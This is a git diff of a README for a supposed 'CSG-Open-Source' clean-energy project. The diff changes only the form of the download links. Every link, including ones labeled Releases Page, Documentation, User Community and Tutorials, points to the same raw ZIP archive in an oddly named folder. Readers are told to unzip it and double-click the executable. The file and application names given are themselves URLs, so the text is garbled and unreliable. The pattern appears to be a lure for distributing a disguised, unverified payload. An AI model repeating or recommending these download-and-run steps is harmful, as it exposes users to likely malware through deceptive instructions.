@@ -6,13 +6,13 @@ Welcome to the CSG-Open-Source repository! This project offers an open technical
 
 ## 📥 Download the Software
 
-[![Download CSG-Open-Source](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip%https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip)](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
+[![Download CSG-Open-Source](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip%https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip)](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
 
 To get the software, simply follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to the Releases page: [CSG Releases Page](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip).
+1. **Visit the Releases Page:** Click on this link to go to the Releases page: [CSG Releases Page](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip).
 2. **Choose Your Version:** On the Releases page, you will see different versions of the software listed. Look for the most recent version, labeled with the highest number.
-3. **Download the File:** Click on the file that you want to download. It may be named something like `https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip` or similar. The file will automatically download to your computer.
+3. **Download the File:** Click on the file that you want to download. It may be named something like `https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip` or similar. The file will automatically download to your computer.
 4. **Locate the Download:** Once the file is downloaded, find it in your Downloads folder or the location you set for downloads.
 
 ## ⚙️ System Requirements
@@ -31,7 +31,7 @@ After downloading the file, follow these steps to install the software:
 
 1. **Unzip the File:** Locate the downloaded ZIP file. Right-click on it and choose the option to "Extract All" or "Unzip" the file.
 2. **Open the Folder:** After extracting, open the newly created folder.
-3. **Run the Application:** Look for the application file, which may be labeled `https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip` for Windows, `https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip` for macOS, or `CSG-Software` for Linux. Double-click the file to start the application.
+3. **Run the Application:** Look for the application file, which may be labeled `https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip` for Windows, `https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip` for macOS, or `CSG-Software` for Linux. Double-click the file to start the application.
 
 ## 🎓 Using the CSG Software
 
@@ -57,12 +57,12 @@ A: Yes! Contributions are welcome. Please check the Contribution Guidelines in t
 
 To learn more about CSG and its applications, explore the following resources:
 
-- [Documentation](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
-- [User Community](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
-- [Tutorials](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
+- [User Community](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
+- [Tutorials](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip)
 
 ## 🔗 Download Again
 
-If you missed it earlier, here is the download link once more: [CSG Releases Page](https://github.com/EVERSON70X/CSG-Open-Source/raw/refs/heads/main/unauthoritiveness/Open-Source-CS-v2.9.zip). 
+If you missed it earlier, here is the download link once more: [CSG Releases Page](https://raw.githubusercontent.com/EVERSON70X/CSG-Open-Source/main/unauthoritiveness/Open-Source-CS-v2.9.zip). 
 
 Thank you for your interest in the CSG-Open-Source project. Enjoy harnessing the power of clean energy!
